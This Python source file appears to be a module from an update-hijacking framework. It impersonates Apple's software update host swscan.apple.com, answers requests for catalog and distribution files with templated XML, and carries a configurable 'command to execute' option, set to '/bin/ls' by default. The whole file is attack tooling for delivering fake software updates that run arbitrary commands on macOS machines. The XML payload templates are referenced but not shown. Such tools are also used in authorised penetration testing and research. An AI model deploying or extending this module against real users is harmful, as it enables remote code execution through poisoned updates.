from modules import ModuleBase


class AppleOSXSoftware(ModuleBase):
    name = 'Apple OS X Software'
    version = '1.0'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = 'swscan.apple.com'
    enabled = False
    options = {
        'pkey': {
            'val': 'rand_num(3) + "-" + rand_num(4)',
            'hidden': 1,
            'dynamic': 1,
        },
        'fname': {
            'val': 'rand_alpha(10)',
            'hidden': 1,
            'dynamic': 1,
        },
        'update': {
            'val': 'rand_alpha(10)',
            'hidden': 1,
            'dynamic': 1,
        },
        'cmd': {
            'val': '/bin/ls',
            'desc': 'command to execute'
        }
    }
    requests = [{
            'path': '\.sucatalog$',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/osx/osx_catalog.xml'
        }, {
            'path': '\.dist$',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/osx/osx_agent.xml'
    }]
